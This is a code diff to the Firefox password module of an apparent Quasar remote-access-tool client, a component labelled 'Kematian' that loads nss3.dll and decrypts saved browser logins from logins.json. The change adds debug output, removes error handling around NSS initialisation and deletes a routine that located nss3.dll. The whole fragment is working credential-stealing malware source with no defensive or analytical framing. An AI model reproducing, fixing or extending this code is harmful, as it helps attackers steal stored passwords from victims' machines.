@@ -43,6 +43,10 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
 
         public long Init(string configDirectory)
         {
+            Debug.WriteLine("----------------------");
+            Debug.WriteLine(configDirectory);
+            Debug.WriteLine("----------------------");
+
             string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
 
             if (!Directory.Exists(mozillaPath))
@@ -59,16 +63,7 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
             NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
             PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
             NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
-            long result = -1;
-            try
-            {
-                result = NSS_Init(configDirectory);
-            }
-            catch (Exception)
-            {
-                return -1;
-            }
-            return result;
+            return NSS_Init(configDirectory);
         }
 
         public string Decrypt(string cypherText)
@@ -151,18 +146,12 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
 
         public List<LoginData> GetLogins(string profilePath, string loginJsonPath = "", string signins_path = "")
         {
-            //TODO: FIX NSS3.DLL SEARCHING AND HOW IT'S USED. WRONG ONE == CAN'T DECRYPT.
             var logins = new List<LoginData>();
 
             if (!File.Exists(loginJsonPath))
             {
                 Debug.WriteLine("Logins.json not found.");
                 return logins;
-            }
-
-            if (nsspath == null)
-            {
-                nsspath = GetNSS3Path();
             }
 
             if (Init(profilePath) != 0)
@@ -272,22 +261,6 @@ namespace Quasar.Client.Kematian.Browsers.Gecko.Passwords
                 NativeMethods.FreeLibrary(NSS3);
                 NativeMethods.FreeLibrary(Mozglue);
             }
-        }
-        public string GetNSS3Path()
-        {
-            string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
-            var directories = SafeEnumerateDirectories(programFiles);
-
-            foreach (var directory in directories)
-            {
-                var nss3Path = Path.Combine(directory, "nss3.dll");
-                if (File.Exists(nss3Path))
-                {
-                    return nss3Path;
-                }
-            }
-
-            return string.Empty;
         }
     }
 }
